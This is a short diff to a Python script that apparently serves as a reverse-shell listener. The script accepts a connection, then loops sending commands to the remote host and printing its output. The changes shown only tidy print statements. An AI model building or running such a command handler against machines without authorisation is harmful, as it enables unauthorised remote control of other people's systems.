@@ -23,8 +23,9 @@ def accept_connection(sock):
         print('[-] Failed to accept the connection', err)
         accept_connection()
     print('[+] Connecting to IP :' , add[0])
-    print('[+] Connecting on Port :,' , add[1], '\n')
+    print('[+] Connecting on Port :' , add[1], '\n')
     send_command(conn, sock)
+
 
 def send_command(conn, sock):
     while True:
@@ -36,7 +37,8 @@ def send_command(conn, sock):
         if len(cmd) > 0:
             conn.send(str.encode((cmd)))
             revcieve_host = str(conn.recv(1024), "utf-8")
-            print(revcieve_host, end="")
+            print(revcieve_host)
+
 
 if __name__ == '__main__':
     create_socket()
